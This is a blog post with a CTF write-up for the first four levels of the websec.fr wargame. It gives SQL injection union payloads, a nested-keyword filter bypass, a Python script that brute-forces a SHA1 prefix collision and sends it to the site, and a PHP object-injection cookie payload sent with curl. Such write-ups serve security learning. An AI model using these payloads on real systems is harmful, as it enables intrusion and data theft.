---
layout: blog
title: "[writeup] websec.ft wargames CTF Writeup"
date: 2020-05-27T18:23:59.297Z
tags:
  - ctf
  - writeup
---
CTF writeup of http://websec.fr/ war-games.

<!--more-->

# websec.fr writeups

## Level 01

```php
class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);

        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}
```

The level one is straightforward, the source code is given so we just have to use `union select`

```sql
SELECT id,username FROM users WHERE id=1 OR 1=2 union select username,password from users where id = 1 LIMIT 1
```

so the payload is: `1 AND 1=2 union select username,password from users where id = 1`

Explanation:

1. we have to bypass first select by making it false, using `AND {false_statement}` so `1=2` == `false`

2. after making the first term `false` we now can use union select with password as my guest column

## Level 02

```php
class LevelTwo {
    public function doQuery($injection) {
        $pdo = new SQLite3('leveltwo.db', SQLITE3_OPEN_READONLY);

        $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
        $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);

        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query ($query);
        $users = $getUsers->fetchArray (SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}
```

the query is just the same as the first level, but with limitation, the query is filtered using `preg_replace`

I’m using php interactive shell to try preg*match, it turns out it does not filter it \_recursively*

```shell
❯ ./psysh
Psy Shell v0.10.4 (PHP 7.3.11 — cli) by Justin Hileman
>>> $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
=> "union|order|select|from|group|by"
>>> $injection = preg_replace ('/' . $searchWords . '/i', '', "from");
=> ""
>>> $injection = preg_replace ('/' . $searchWords . '/i', '', "frfromom");
=> "from"
```

so we can bypass the query just by modifying forbidden word

final query: `1 and 1=2 UNunionION SELselectECT username,password FRfromOM users where id =1 --`

## Level 03

When doing this challenge, I notice after copying the source code to my text editor, is the `sha1` function is written with argument `fa1se` not `false`. It makes the `sha1`'s parameter raw_output equals to `true`, so the output is raw binary.

So what? we notic that we can truncate the byte with null terminator `\0`. Fortunately, the hash of the password in the challenge contains null byte too:(`7c00249d409a91ab84e3f421c193520d9fb3674b`)

So we can make a hash collision by finding a hash that starts with: `0x7c 0x00`

I wrote a script,

```python
import hashlib
import base64
import codecs
import requests
import re

the_answer = ""

i = 0
while True:
    v = "%x" % i
    v = "0" + v if len(v) % 2 == 1 else v
    v = base64.b64encode(codecs.decode(v, "hex"))
    h = hashlib.sha1(v).digest()[:2]
    if h == b"\x7c\x00":
        the_answer = str(v).replace("b", "").replace("\'", "")
        break
    i += 1


r = requests.post('http://websec.fr/level03/index.php', data={'c': the_answer })
flag = re.search(r'(.*?WEBSEC.*?)\n', r.text)
print(flag.group(0))
```

## Level 04

given this source code, lets analyze the codes:

```php
// source1.php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
```

1. There is unserialize method without input validation, we can assume we can use PHP object injection attack
2. We can abuse the unserialize method by crafting our payload on cookies

```php
//source2.php

<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }

    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }

        $ret = $this->execute ();
        if (false !== $ret) {
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
```

1. We can see from the source2, the codes implemented magic function `__descruct()`, this magic function will be called automatically without invocation.
2. furthermore, from `__destruct()` method, it will query to database and show `$row[username]` field, so actually we have to craft `UNION` query but it's easier to use `AS` keyword to change from username field to password field

We can craft the payload using this php script:

```php
// payload.php

<?php

class SQL
{
    public $query = 'SELECT password AS username FROM users WHERE id=1';
    public $conn;
}

$serialized = serialize(new SQL());
echo base64_encode($serialized);
```

output generated: `TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6NDk6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO3M6NDoiY29ubiI7Tjt9`

try this using curl, or using browser and set your cookie

```shell
❯ curl -b 'leet_hax0r=TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6NDk6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO3M6NDoiY29ubiI7Tjt9' http://websec.fr/level04/index.php
```

further reads:

- https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection

- https://www.notsosecure.com/remote-code-execution-via-php-unserialize/
